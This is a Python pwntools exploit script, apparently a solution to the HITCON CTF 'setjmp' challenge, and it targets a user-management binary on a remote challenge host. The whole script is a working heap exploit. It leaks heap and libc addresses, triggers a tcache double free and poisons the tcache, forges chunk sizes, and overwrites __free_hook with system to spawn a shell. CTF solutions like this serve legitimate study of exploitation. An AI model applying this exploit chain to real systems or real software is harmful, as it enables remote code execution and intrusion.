#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host setjmp.chal.hitconctf.com --port 1337 run
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'run')
context.terminal = "tmux splitw -h".split()
context.terminal = ["remotinator", "vsplit", "-x"]


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'setjmp.chal.hitconctf.com'
port = int(args.PORT or 1337)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
libc = exe.libc

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# b longjmp
# brva 0x1737
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled

itob = lambda x: str(x).encode()

def menu_choice(choice: int):
    io.sendlineafter(b"exit\n> ", itob(choice))

def goto_menu():    menu_choice(0)
def restart():      menu_choice(1)

def create_user(username: bytes, password: bytes):
    menu_choice(2)
    io.sendafter(b"username > ", username.ljust(8, b"\x00") + password.ljust(8, b"\x00"))

def create_user_nopad(username: bytes, password: bytes):
    menu_choice(2)
    io.sendafter(b"username > ", username)
    io.sendafter(b"password > ", password)

def del_user(username: bytes, wait=True) -> bool:
    menu_choice(3)
    io.sendafter(b"username > ", username.ljust(8, b"\x00"))
    if not wait: return
    if b"not found" in io.recvline():
        return False
    return True

def change_pass(username: bytes, password: bytes) -> bool:
    menu_choice(4)
    io.sendafter(b"username > ", username.ljust(8, b"\x00"))
    if b"not" in io.recv(0x4):
        return False
    io.send(password.ljust(8, b"\x00"))
    return True

def view_users() -> list:
    menu_choice(5)
    users = list()
    while True:
        temp = io.recvline().strip()
        if b"---- menu ----" in temp:
            break
        result = temp.split(b": ")
        if len(result) == 2:
            users.append((result[0], result[1]))
        else:
            users.append((result[0], b""))
    return users

def leak_heap() -> int:
    log.info("leak heap address")
    change_pass(b"root", b"A"*8)
    users = view_users()
    assert len(users) > 0
    heap_leak = u64(users[0][1][8:].ljust(8, b"\x00")) & 0xfffffffff000
    assert heap_leak & 0xf00000000000 > 0
    log.info(f"heap @ {hex(heap_leak)}")
    return heap_leak

def double_free():
    # trigger double free in tcache
    username0 = p8(0x11)*8
    create_user(username0, username0)
    assert del_user(b"root")
    assert del_user(username0)
    username = view_users()[0][0]
    change_pass(username, b"whatever")
    assert del_user(username)

io = start()

heap_base = leak_heap()
restart()
double_free()
offset = 0x3a0
fd_ptr = p64(heap_base + offset)
username1 = p8(0x22)*8
username2 = p8(0x33)*8
create_user(fd_ptr, username1)
create_user(username2, username2)

info("spawn some chunks")
us = [p8(c)*8 for c in range(ord('a'), ord('a')+5)]

for u in us:
    create_user(u, b'')

for u in us:
    del_user(u)


info("poisoning tcache")
restart()
username0 = p8(0x11)*8
username1 = p8(0x22)*8
create_user(username0, username0)
create_user(username1, username1)
assert del_user(b"root")
assert del_user(username0)
assert del_user(username1)
username = view_users()[0][0]
change_pass(username, b"whatever")
assert del_user(username)

heap = lambda off: heap_base + off
offset = 0x90
fd_ptr = p64(heap(offset))
username1 = p8(0x22)*8
username2 = p8(0x33)*8
create_user(fd_ptr, username1)
create_user(username2, username2)


overwriter = b'jakub'
create_user(overwriter, p64(heap(0x10)))

info('ensure tcache[0x30] have 0xff chunks')
create_user(p64(0x0000000000ff0000), b'')

# use this to set tcache[0x30] ptr to addr you want (heap relative)
def set_overwriter(addr):
    info(f"set_overwriter: {heap(addr):#x}")
    change_pass(overwriter, p64(heap(addr)))


info('write fake size')
set_overwriter(0x370)
create_user(b'tomek', p64(0x501))

set_overwriter(0x380)
# restore next, prev
create_user(p64(heap(0x10)), p64(heap(0x770)))

set_overwriter(0x370+0x500)
create_user(b'bartek', p64(0x21))

set_overwriter(0x370+0x500+0x20)
create_user(b'bartek', p64(0x21))

info("spawns unsorted")
del_user(p64(heap(0x10)))

info("zero jakub's prev. set next to first user, to terminate printing routine")
set_overwriter(0xa0)
create_user(b'', p64(heap(0x380)))

set_overwriter(0x380)
create_user_nopad(p8(0x60), p8(0))

users = view_users()
jakub = users[2]
libc_leak = u64(jakub[1].ljust(8, p8(0)))
success(f'libc_leak: {libc_leak:#x}')

libc.address = libc_leak -0x1ecbe0
success(f'libc.address : {libc.address :#x}')

free_hook = libc.sym['__free_hook']
info(f'free_hook: {free_hook:#x}')
change_pass(overwriter, p64(free_hook))

create_user(p64(libc.sym.system), cyclic(8))

# trigger free hook
set_overwriter(0x600)
create_user(b'/bin/sh', cyclic(8))
del_user(b'/bin/sh\x00', wait=False)

io.interactive()
